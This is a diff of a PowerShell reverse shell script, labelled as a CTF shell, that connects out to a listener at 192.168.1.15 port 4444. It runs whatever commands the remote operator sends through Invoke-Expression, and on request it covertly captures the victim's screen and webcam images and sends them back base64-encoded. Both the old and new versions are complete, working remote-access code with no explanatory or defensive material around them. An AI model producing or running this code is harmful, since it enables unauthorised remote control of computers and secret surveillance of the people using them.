@@ -1,66 +1,83 @@
-# --- THE FINAL BOSS: FULL LOOT VERSION ---
+# --- THE COMPLETED ATOMIC CTF SHELL ---
 $ip = '192.168.1.15'
 $port = 4444
 
+# 1. Establish the Connection
 $c = New-Object System.Net.Sockets.TCPClient
-$c.Connect($ip, $port)
-$s = $c.GetStream()
-$r = New-Object System.IO.StreamReader($s)
-$w = New-Object System.IO.StreamWriter($s)
-$w.AutoFlush = $true
+try {
+    $c.Connect($ip, $port)
+    $s = $c.GetStream()
+    $r = New-Object System.IO.StreamReader($s)
+    $w = New-Object System.IO.StreamWriter($s)
+    $w.AutoFlush = $true
 
-$w.WriteLine("--- SYSTEM COMPROMISED: $($env:COMPUTERNAME) ---")
+    $w.WriteLine("--- ATOMIC SHELL FULL ACCESS: $($env:COMPUTERNAME) ---")
 
-while($c.Connected) {
-    $w.Write("PS " + (Get-Location).Path + "> ")
-    $raw = $r.ReadLine()
-    if ($null -eq $raw) { break }
-    $cmd = $raw.Trim()
-    if ($cmd -eq "exit") { break }
+    # 2. The Main Interaction Loop
+    while($c.Connected) {
+        $w.Write("PS " + (Get-Location).Path + "> ")
+        $line = $r.ReadLine()
+        if ($null -eq $line) { break }
+        
+        $cmd = $line.Trim()
+        if ($cmd -eq "exit") { break }
+        if ([string]::IsNullOrWhiteSpace($cmd)) { continue }
 
-    if ($cmd -eq "screenshot") {
-        # --- SCREENSHOT ---
-        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-        $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bmp = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
-        $g = [System.Drawing.Graphics]::FromImage($bmp)
-        $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
-        $mem = New-Object System.IO.MemoryStream
-        $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-        $out = [Convert]::ToBase64String($mem.ToArray())
-        $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
-        $w.WriteLine($out)
-    } 
-    elseif ($cmd -eq "webcam") {
-        # --- WEBCAM (STABLE WINRT) ---
-        try {
-            # Load WinRT Projection
-            [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
-            [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.Properties, ContentType=WindowsRuntime]
-            
-            $mc = New-Object Windows.Media.Capture.MediaCapture
-            $mc.InitializeAsync().GetAwaiter().GetResult()
-            
-            $fmt = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
-            $low = $mc.PrepareLowLagPhotoCaptureAsync($fmt).GetAwaiter().GetResult()
-            $photo = $low.CaptureAsync().GetAwaiter().GetResult()
-            
-            # Use .AsStreamForRead() from the WinRT projection
-            $stream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($photo.Frame)
-            $ms = New-Object System.IO.MemoryStream
-            $stream.CopyTo($ms)
-            
-            $out = [Convert]::ToBase64String($ms.ToArray())
-            $ms.Dispose(); $stream.Dispose(); $mc.Dispose()
-            $w.WriteLine($out)
-        } catch {
-            $w.WriteLine("Webcam Error: $($_.Exception.Message)")
+        # --- LOGIC BRANCHING ---
+        if ($cmd -eq "screenshot") {
+            # SCREENSHOT LOGIC
+            try {
+                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                $bmp  = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
+                $g    = [System.Drawing.Graphics]::FromImage($bmp)
+                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
+                $mem  = New-Object System.IO.MemoryStream
+                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                $out  = [Convert]::ToBase64String($mem.ToArray())
+                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
+                $w.WriteLine($out)
+            } catch { $w.WriteLine("Screenshot Error: $($_.Exception.Message)") }
+        } 
+        elseif ($cmd -eq "webcam") {
+            # WEBCAM LOGIC (POLLED ASYNC)
+            try {
+                [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
+                $mc = New-Object Windows.Media.Capture.MediaCapture
+                
+                # Manual Polling for Async Initialization
+                $task = $mc.InitializeAsync()
+                while ($task.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
+                
+                $fmt = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
+                $prep = $mc.PrepareLowLagPhotoCaptureAsync($fmt)
+                while ($prep.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
+                
+                $lowLag = $prep.GetResults()
+                $snap = $lowLag.CaptureAsync()
+                while ($snap.Status -eq 'Started') { Start-Sleep -Milliseconds 100 }
+                
+                $photo = $snap.GetResults()
+                $stream = $photo.Frame.AsStreamForRead()
+                $ms = New-Object System.IO.MemoryStream
+                $stream.CopyTo($ms)
+                
+                $out = [Convert]::ToBase64String($ms.ToArray())
+                $ms.Dispose(); $stream.Dispose(); $mc.Dispose()
+                $w.WriteLine($out)
+            } catch { $w.WriteLine("Webcam Error: $($_.Exception.Message)") }
+        } 
+        else {
+            # STANDARD SYSTEM COMMANDS
+            try {
+                $out = Invoke-Expression $cmd 2>&1 | Out-String
+                if ([string]::IsNullOrWhiteSpace($out)) { $out = "Command executed." }
+                $w.WriteLine($out)
+            } catch { $w.WriteLine("Shell Error: $($_.Exception.Message)") }
         }
     }
-    else {
-        # --- COMMANDS ---
-        $out = iex $cmd 2>&1 | Out-String
-        $w.WriteLine($out)
-    }
+} catch {
+    # If the initial connection fails
+} finally {
+    if ($c) { $c.Close() }
 }
-$c.Close()
